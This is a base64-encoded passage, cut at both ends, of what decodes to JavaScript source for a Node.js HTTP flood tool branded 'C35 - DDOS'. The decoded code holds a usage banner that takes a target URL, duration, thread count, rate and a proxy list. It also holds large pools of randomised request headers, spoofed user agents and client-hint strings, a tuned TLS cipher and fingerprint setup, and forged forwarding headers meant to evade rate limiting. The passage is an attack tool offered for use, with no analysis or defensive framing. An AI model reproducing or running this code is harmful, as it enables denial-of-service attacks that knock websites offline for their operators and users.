txPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCcsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2NzcycsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2Nzcyx0ZXh0L2phdmFzY3JpcHQnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQsdGV4dC9wbGFpbixhcHBsaWNhdGlvbi9qc29uLGFwcGxpY2F0aW9uL3htbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsdGV4dC9jc3MsdGV4dC9qYXZhc2NyaXB0LGFwcGxpY2F0aW9uL2phdmFzY3JpcHQnLAogICAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQsdGV4dC9wbGFpbixhcHBsaWNhdGlvbi9qc29uLGFwcGxpY2F0aW9uL3htbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsdGV4dC9jc3MsdGV4dC9qYXZhc2NyaXB0LGFwcGxpY2F0aW9uL2phdmFzY3JpcHQsYXBwbGljYXRpb24veG1sLWR0ZCcsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCx0ZXh0L3BsYWluLGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2Nzcyx0ZXh0L2phdmFzY3JpcHQsYXBwbGljYXRpb24vamF2YXNjcmlwdCxhcHBsaWNhdGlvbi94bWwtZHRkLHRleHQvY3N2JywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkLHRleHQvcGxhaW4sYXBwbGljYXRpb24vanNvbixhcHBsaWNhdGlvbi94bWwsYXBwbGljYXRpb24veGh0bWwreG1sLHRleHQvY3NzLHRleHQvamF2YXNjcmlwdCxhcHBsaWNhdGlvbi9qYXZhc2NyaXB0LGFwcGxpY2F0aW9uL3htbC1kdGQsdGV4dC9jc3YsYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjksYXBwbGljYXRpb24vanNvbixhcHBsaWNhdGlvbi94bWwsYXBwbGljYXRpb24veGh0bWwreG1sJywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjksYXBwbGljYXRpb24vanNvbixhcHBsaWNhdGlvbi94bWwsYXBwbGljYXRpb24veGh0bWwreG1sLHRleHQvY3NzJywKICAgJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjksYXBwbGljYXRpb24vanNvbixhcHBsaWNhdGlvbi94bWwsYXBwbGljYXRpb24veGh0bWwreG1sLHRleHQvY3NzLHRleHQvamF2YXNjcmlwdCcsCiAgICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45LGFwcGxpY2F0aW9uL2pzb24sYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2Nzcyx0ZXh0L2phdmFzY3JpcHQsYXBwbGljYXRpb24vamF2YXNjcmlwdCcKXSwKY2FjaGVfaGVhZGVyID0gWwogICAnbWF4LWFnZT0wJywKICAgJ25vLWNhY2hlJywKICAgJ25vLXN0b3JlJywgCiAgICdwcmUtY2hlY2s9MCcsCiAgICdwb3N0LWNoZWNrPTAnLAogICAnbXVzdC1yZXZhbGlkYXRlJywKICAgJ3Byb3h5LXJldmFsaWRhdGUnLAogICAncy1tYXhhZ2U9NjA0ODAwJywKICAgJ25vLWNhY2hlLCBuby1zdG9yZSxwcml2YXRlLCBtYXgtYWdlPTAsIG11c3QtcmV2YWxpZGF0ZScsCiAgICduby1jYWNoZSwgbm8tc3RvcmUscHJpdmF0ZSwgcy1tYXhhZ2U9NjA0ODAwLCBtdXN0LXJldmFsaWRhdGUnLAogICAnbm8tY2FjaGUsIG5vLXN0b3JlLHByaXZhdGUsIG1heC1hZ2U9NjA0ODAwLCBtdXN0LXJldmFsaWRhdGUnLAogICAnbm8tdHJhbnNmb3JtJywKICAgJ29ubHktaWYtY2FjaGVkJywKICAgJ3B1YmxpYycsCiAgICdwcml2YXRlJywKICAgJ3N0YWxlLWlmLWVycm9yJywKICAgJ21heC1hZ2U9MzE1NTc2MDAnLAogICAnbWF4LWFnZT0yNTkyMDAwJywKICAgJ3MtbWF4YWdlJywKICAgJ21pbi1mcmVzaCcsCiAgICdtYXgtYWdlPTMxNTM2MDAwLHB1YmxpYycsCiAgICdtYXgtYWdlPTMxNTM2MDAwLHB1YmxpYyxpbW11dGFibGUnLAogICAncHJpdmF0ZSwgbWF4LWFnZT0wLCBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCcsCiAgICdwdWJsaWMsIGltbXV0YWJsZSwgbWF4LWFnZT0zMTUzNjAwMCcsCiAgICdtYXgtc3RhbGUnLAogICAnbWF4LWFnZT0zMTUzNjAwMDAnLAogICAncHVibGljLCBtYXgtYWdlPTg2NDAwLCBzdGFsZS13aGlsZS1yZXZhbGlkYXRlPTYwNDgwMCwgc3RhbGUtaWYtZXJyb3I9NjA0ODAwJwoKXSwKR2VuZXJhdGVfRW5jb2RpbmcgPSBbCiAgJyonLAogICcqLyonLAogICdnemlwJywKICAnZ3ppcCwgZGVmbGF0ZSwgYnInLAogICdjb21wcmVzcywgZ3ppcCcsCiAgJ2RlZmxhdGUsIGd6aXAnLAogICdnemlwLCBpZGVudGl0eScsCiAgJ2d6aXAsIGRlZmxhdGUnLAogICdicicsCiAgJ2JyO3E9MS4wLCBnemlwO3E9MC44LCAqO3E9MC4xJywKICAnZ3ppcDtxPTEuMCwgaWRlbnRpdHk7IHE9MC41LCAqO3E9MCcsCiAgJ2d6aXAsIGRlZmxhdGUsIGJyO3E9MS4wLCBpZGVudGl0eTtxPTAuNSwgKjtxPTAuMjUnLAogICdjb21wcmVzcztxPTAuNSwgZ3ppcDtxPTEuMCcsCiAgJ2lkZW50aXR5JywKICAnZ3ppcCwgY29tcHJlc3MnLAogICdjb21wcmVzcywgZGVmbGF0ZScsCiAgJ2NvbXByZXNzJywKICAnZ3ppcCwgZGVmbGF0ZSwgYnInLAogICdkZWZsYXRlJywKICAnZ3ppcCwgZGVmbGF0ZSwgbHptYSwgc2RjaCcsCiAgJ2RlZmxhdGUnCgpdLApsYW5ndWFnZV9oZWFkZXIgPSBbCiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLAogJ2ZyLUNILCBmcjtxPTAuOSwgZW47cT0wLjgsIGRlO3E9MC43LCAqO3E9MC41JwpdLAoKZGVzdF9oZWFkZXIgPSBbCiAgICdhdWRpbycsCiAgICdhdWRpb3dvcmtsZXQnLAogICAnZG9jdW1lbnQnLAogICAnZW1iZWQnLAogICAnZW1wdHknLAogICAnZm9udCcsCiAgICdmcmFtZScsCiAgICdpZnJhbWUnLAogICAnaW1hZ2UnLAogICAnbWFuaWZlc3QnLAogICAnb2JqZWN0JywKICAgJ3BhaW50d29ya2xldCcsCiAgICdyZXBvcnQnLAogICAnc2NyaXB0JywKICAgJ3NlcnZpY2V3b3JrZXInLAogICAnc2hhcmVkd29ya2VyJywKICAgJ3N0eWxlJywKICAgJ3RyYWNrJywKICAgJ3ZpZGVvJywKICAgJ3dvcmtlcicsCiAgICd4c2x0JywKICAgInVua25vd24iLAogICAic3VicmVzb3VyY2UiCl0sCgptb2RlX2hlYWRlciA9IFsKICAgJ2NvcnMnLAogICAnbmF2aWdhdGUnLAogICAnbm8tY29ycycsCiAgICdzYW1lLW9yaWdpbicsCiAgICd3ZWJzb2NrZXQnCl0sCnNpdGVfaGVhZGVyID0gWwogICAnY3Jvc3Mtc2l0ZScsCiAgICdzYW1lLW9yaWdpbicsCiAgICdzYW1lLXNpdGUnLAogICAnbm9uZScKXSwKc2VjX2NoX3VhID0gWwogICAnIk5vdF9BIEJyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTIwIicsCiAgICciTm90LkEvQnJhbmQiO3Y9IjgiLCAiQ2hyb21pdW0iO3Y9IjExNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTQiJywKICAgJyJOb3QuQS9CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTE0IiwgIkJyYXZlIjt2PSIxMTQiJywKICAgJyJOb3RfQSBCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTA5IiwgIkNocm9taXVtIjt2PSIxMDkiJywKICAgJyJHb29nbGUgQ2hyb21lIjt2PSIxMTkiLCAiQ2hyb21pdW0iO3Y9IjExOSIsICJOb3Q/QV9CcmFuZCI7dj0iMjQiJywKICAgJyJHb29nbGUgQ2hyb21lIjt2PSIxMTgiLCAiQ2hyb21pdW0iO3Y9IjExOCIsICJOb3Q/QV9CcmFuZCI7dj0iOTkiJywKICAgJyJHb29nbGUgQ2hyb21lIjt2PSIxMTciLCAiQ2hyb21pdW0iO3Y9IjExNyIsICJOb3Q/QV9CcmFuZCI7dj0iMTYiJywKICAgJyJHb29nbGUgQ2hyb21lIjt2PSIxMTYiLCAiQ2hyb21pdW0iO3Y9IjExNiIsICJOb3Q/QV9CcmFuZCI7dj0iOCInLAogICAnIkdvb2dsZSBDaHJvbWUiO3Y9IjExNSIsICJDaHJvbWl1bSI7dj0iMTE1IiwgIk5vdD9BX0JyYW5kIjt2PSI5OSInLAogICAnIkdvb2dsZSBDaHJvbWUiO3Y9IjExOCIsICJDaHJvbWl1bSI7dj0iMTE4IiwgIk5vdD9BX0JyYW5kIjt2PSIyNCInLAogICAnIkdvb2dsZSBDaHJvbWUiO3Y9IjExNyIsICJDaHJvbWl1bSI7dj0iMTE3IiwgIk5vdD9BX0JyYW5kIjt2PSIyNCInLAogICAnIkNocm9taXVtIjt2PSIxMTYiLCAiTm90KUE7QnJhbmQiO3Y9IjgiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE2IicsCiAgICciQ2hyb21pdW0iO3Y9IjExNSIsICJOb3QpQTtCcmFuZCI7dj0iOCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTUiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE0IiwgIk5vdClBO0JyYW5kIjt2PSI4IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExNCInLAogICAnIkNocm9taXVtIjt2PSIxMTMiLCAiTm90KUE7QnJhbmQiO3Y9IjgiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEzIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMiIsICJOb3QpQTtCcmFuZCI7dj0iOCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTIiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE2IiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTYiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE1IiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTUiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE0IiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTQiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEzIiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTMiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEyIiwgIk5vdClBO0JyYW5kIjt2PSIyNCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTIiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE2IiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTYiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE1IiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTUiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE0IiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTQiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEzIiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTMiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEyIiwgIk5vdClBO0JyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTIiJywKICAgJyJDaHJvbWl1bSI7dj0iMTE2LjAuMC4wIiwgIk5vdClBO0JyYW5kIjt2PSI4LjAuMC4wIiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExNi4wLjAuMCInLAogICAnIkNocm9taXVtIjt2PSIxMTUuMC4wLjAiLCAiTm90KUE7QnJhbmQiO3Y9IjguMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE1LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNC4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOC4wLjAuMCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMTQuMC4wLjAiJywKICAgJyJDaHJvbWl1bSI7dj0iMTEzLjAuMC4wIiwgIk5vdClBO0JyYW5kIjt2PSI4LjAuMC4wIiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExMy4wLjAuMCInLAogICAnIkNocm9taXVtIjt2PSIxMTIuMC4wLjAiLCAiTm90KUE7QnJhbmQiO3Y9IjguMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEyLjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNi4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE2LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNS4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE1LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNC4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE0LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMy4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEzLjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMi4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iMjQuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEyLjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNi4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE2LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNS4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE1LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExNC4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTE0LjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMy4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEzLjAuMC4wIicsCiAgICciQ2hyb21pdW0iO3Y9IjExMi4wLjAuMCIsICJOb3QpQTtCcmFuZCI7dj0iOTkuMC4wLjAiLCAiR29vZ2xlIENocm9tZSI7dj0iMTEyLjAuMC4wIicKXTsKCnByb2Nlc3Muc2V0TWF4TGlzdGVuZXJzKDApOwpyZXF1aXJlKCJldmVudHMiKS5FdmVudEVtaXR0ZXIuZGVmYXVsdE1heExpc3RlbmVycyA9IDA7CgppZiAocHJvY2Vzcy5hcmd2Lmxlbmd0aCA8IDYpIHsKICBjb25zb2xlLmxvZygnbm9kZSByYXcgdGFyZ2V0IHRpbWUgcmF0ZSB0aHJlYWQgcHJveHknLnJhaW5ib3cpOwoKICBjb25zb2xlLmxvZyhgCiAgIF9fX19fXyAgIF9fX19fXyAgIF9fX19fX18gICAgICAgICAgICAgX19fX19fICAgX19fX19fICAgICAgX19fICAgICBfX19fX18gICAKIC4nIF9fXyAgfCAvIF9fX18gXGAufCAgX19fX198ICAgICAgICAgICB8XyAgIF8gXGAufF8gICBfIFxgLiAgLicgICBcYC4gLicgX19fXyBcICAKLyAuJyAgIFxcX3wgXGAnICBfXykgfHwgfF9fX18gICAgIF9fX19fXyAgICB8IHwgXGAuIFxcIHwgfCBcYC4gXFwvICAuLS4gIFxcfCAoX19fIFxcX3wgCnwgfCAgICAgICAgXyAgfF9fICcuJ18uX19fXycnLnxfX19fX198ICAgfCB8ICB8IHwgfCB8ICB8IHx8IHwgICB8IHwgXy5fX19fXGAuICAKXFwgXGAuX19fLidcXHwgXFxfX19fKSB8fCBcXF9fX18pIHwgICAgICAgICAgIF98IHxfLicgL198IHxfLicgL1xcICBcYC0nICAvfCBcXF9fX18pIHwgCiBcYC5fX19fIC4nIFxcX19fX19fLicgXFxfX19fX18uJyAgICAgICAgICB8X19fX19fLid8X19fX19fLicgIFxgLl9fXy4nICBcXF9fX19fXy4nIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMKIyAgIFRPT0wgOiBDMzUgLSBERE9TICAgICAgIHwgICAgICBCWSA6ICBUUuG6pk4gSMOATyBERVYgICAgICAgICAgICAjCiMgICBURUFNIDogREFSS1NUQUNLICAgICAgICB8ICAgICAgVEVMRTogQEhBT01JTEtOTiAgICAgICAgICAgICAgIwojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpkZW1vIDogbm9kZSBDMzVERE9TLmpzIDx1cmw+IDx0aW1lPiA8dGhyZWFkcz4gPHJhdGU+IHByb3h5LnR4dApgLndoaXRlKTsKCiAgcHJvY2Vzcy5leGl0KCk7Cn0KCmNvbnN0IGRlZmF1bHRDaXBoZXJzID0gY3J5cHRvLmNvbnN0YW50cy5kZWZhdWx0Q29yZUNpcGhlckxpc3Quc3BsaXQoIjoiKTsKY29uc3QgY2lwaGVycyA9ICJHUkVBU0U6IiArIFsKICAgIGRlZmF1bHRDaXBoZXJzWzJdLAogICAgZGVmYXVsdENpcGhlcnNbMV0sCiAgICBkZWZhdWx0Q2lwaGVyc1swXSwKICAgIC4uLmRlZmF1bHRDaXBoZXJzLnNsaWNlKDMpCl0uam9pbigiOiIpOwoKZnVuY3Rpb24gZ2V0UmFuZG9tVmFsdWUoYXJyYXkpIHsKICAgIHJldHVybiBhcnJheVtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBhcnJheS5sZW5ndGgpXTsKfQpjb25zdCBvcGVyYXRpbmdTeXN0ZW1zID0gWwogICAgIldpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCIsCiAgICAiTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83IiwKICAgICJYMTE7IExpbnV4IHg4Nl82NCIsCiAgICAiQW5kcm9pZCAxMDsgTW9iaWxlIiwKICAgICJpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTRfMiBsaWtlIE1hYyBPUyBYIgpdOwpjb25zdCBhcmNoaXRlY3R1cmVzID0gewogICAgIldpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCI6ICJXT1c2NCIsCiAgICAiTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83IjogIng4Nl82NCIsCiAgICAiWDExOyBMaW51eCB4ODZfNjQiOiAieDg2XzY0IiwKICAgICJBbmRyb2lkIDEwOyBNb2JpbGUiOiAiYXJtdjdsIiwKICAgICJpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTRfMiBsaWtlIE1hYyBPUyBYIjogImFybTY0Igp9Owpjb25zdCBicm93c2VycyA9IFsKICAgICJDaHJvbWUvOTEuMC40NDcyLjEyNCIsCiAgICAiU2FmYXJpLzUzNy4zNiIsCiAgICAiRmlyZWZveC84OS4wIiwKICAgICJFZGdlLzkxLjAuODY0LjU0IiwKICAgICJPcGVyYS83Ny4wLjQwNTQuMTcyIgpdOwpjb25zdCBza2lkID0gWwogICAgIjEwMDA1NDY1MjM3IiwKICAgICI4ODUxMDY0NjM0IiwKICAgICI4OTMxMzY0NjI1MyIsCiAgICAiMjIwNjQyMzk0MiIsCiAgICAiMTI2MzU0OTU2MzEiCl07CmNvbnN0IGxvbCA9IHNraWRbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogc2tpZC5sZW5ndGgpXTsKY29uc3QgcmFuZG9tT1MgPSBnZXRSYW5kb21WYWx1ZShvcGVyYXRpbmdTeXN0ZW1zKTsKY29uc3QgcmFuZG9tQXJjaCA9IGFyY2hpdGVjdHVyZXNbcmFuZG9tT1NdOwpjb25zdCByYW5kb21Ccm93c2VyID0gZ2V0UmFuZG9tVmFsdWUoYnJvd3NlcnMpOwpjb25zdCB1YXAgPSBgTW96aWxsYS81LjAgKCR7cmFuZG9tT1N9OyAke2xvbH07ICR7cmFuZG9tQXJjaH0pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pICR7cmFuZG9tQnJvd3Nlcn1gOwoKY29uc3Qgc2lnYWxncyA9IFsKICAgICAgICdlY2RzYV9zZWNwMjU2cjFfc2hhMjU2JywKICAgICAgICdlY2RzYV9zZWNwMzg0cjFfc2hhMzg0JywKICAgICAgICdlY2RzYV9zZWNwNTIxcjFfc2hhNTEyJywKICAgICAgICdyc2FfcHNzX3JzYWVfc2hhMjU2JywKICAgICAgICdyc2FfcHNzX3JzYWVfc2hhMzg0JywKICAgICAgICdyc2FfcHNzX3JzYWVfc2hhNTEyJywKICAgICAgICdyc2FfcGtjczFfc2hhMjU2JywKICAgICAgICdyc2FfcGtjczFfc2hhMzg0JywKICAgICAgICdyc2FfcGtjczFfc2hhNTEyJywKXSAKbGV0IFNpZ25hbHNMaXN0ID0gc2lnYWxncy5qb2luKCc6JykKY29uc3QgZWNkaEN1cnZlID0gIkdSRUFTRTpYMjU1MTk6eDI1NTE5OlAtMjU2OlAtMzg0OlAtNTIxOlg0NDgiOyJHUkVBU0U6WDI1NTE5OngyNTUxOSI7Cgpjb25zdCBzZWN1cmVPcHRpb25zID0gCmNyeXB0by5jb25zdGFudHMuU1NMX09QX05PX1NTTHYyIHwKY3J5cHRvLmNvbnN0YW50cy5TU0xfT1BfTk9fU1NMdjMgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9OT19UTFN2MSB8CmNyeXB0by5jb25zdGFudHMuU1NMX09QX05PX1RMU3YxXzEgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9OT19UTFN2MV8zIHwKY3J5cHRvLmNvbnN0YW50cy5BTFBOX0VOQUJMRUQgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9BTExPV19VTlNBRkVfTEVHQUNZX1JFTkVHT1RJQVRJT04gfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9DSVBIRVJfU0VSVkVSX1BSRUZFUkVOQ0UgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9MRUdBQ1lfU0VSVkVSX0NPTk5FQ1QgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9DT09LSUVfRVhDSEFOR0UgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9QS0NTMV9DSEVDS18xIHwKY3J5cHRvLmNvbnN0YW50cy5TU0xfT1BfUEtDUzFfQ0hFQ0tfMiB8CmNyeXB0by5jb25zdGFudHMuU1NMX09QX1NJTkdMRV9ESF9VU0UgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9TSU5HTEVfRUNESF9VU0UgfApjcnlwdG8uY29uc3RhbnRzLlNTTF9PUF9OT19TRVNTSU9OX1JFU1VNUFRJT05fT05fUkVORUdPVElBVElPTjsKCmNvbnN0IHNlY3VyZVByb3RvY29sID0gIlRMU19jbGllbnRfbWV0aG9kIjsiVExTdjFfM19tZXRob2QiLCJUTFNfbWV0aG9kIjsKY29uc3QgaGVhZGVycyA9IHt9OwoKY29uc3Qgc2VjdXJlQ29udGV4dE9wdGlvbnMgPSB7CiAgICBjaXBoZXJzOiBjaXBoZXJzLAogICAgc2lnYWxnczogU2lnbmFsc0xpc3QsCiAgICBob25vckNpcGhlck9yZGVyOiB0cnVlLAogICAgc2VjdXJlT3B0aW9uczogc2VjdXJlT3B0aW9ucywKICAgIHNlY3VyZVByb3RvY29sOiBzZWN1cmVQcm90b2NvbAp9OwoKY29uc3Qgc2VjdXJlQ29udGV4dCA9IHRscy5jcmVhdGVTZWN1cmVDb250ZXh0KHNlY3VyZUNvbnRleHRPcHRpb25zKTsKY29uc3QgcmF0ZUhlYWRlcnMgPSBbCiAgIHsgImFrYW1haS1vcmlnaW4taG9wIjogcmFuZHN0cig1KX0sCiAgIHsgInNvdXJjZS1pcCI6IHJhbmRzdHIoNSkgIH0sCiAgIHsgInZpYSI6IHJhbmRzdHIoNSkgIH0sCiAgIHsgImNsdXN0ZXItaXAiOiByYW5kc3RyKDUpICB9LAogICB7ICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3QiIDogIjEifSwKICAgeyJhY2NlcHQiOiBhY2NlcHRfaGVhZGVyW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSphY2NlcHRfaGVhZGVyLmxlbmd0aCldfSwKICAgeyJhY2NlcHQtY2hhcnNldCIgOiBhY2NlcHRfaGVhZGVyW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKS